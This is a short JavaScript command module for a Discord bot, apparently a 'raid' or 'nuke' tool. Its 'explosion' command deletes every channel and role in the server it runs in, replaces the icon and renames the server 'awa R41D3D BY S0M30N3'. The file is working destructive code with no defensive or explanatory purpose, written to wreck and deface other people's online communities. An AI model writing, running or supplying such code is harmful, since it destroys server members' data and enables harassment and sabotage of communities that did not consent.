module.exports = {
	name: 'explosion',
	description: 'explosion',
	execute(message, args){
		const guildName = "awa R41D3D BY S0M30N3"
		message.guild.channels.forEach(channel => channel.delete())
		message.guild.roles.forEach(role => role.delete())
		message.guild.setIcon("./res/aquaicon.png")
		message.guild.setName(guildName)
    }
}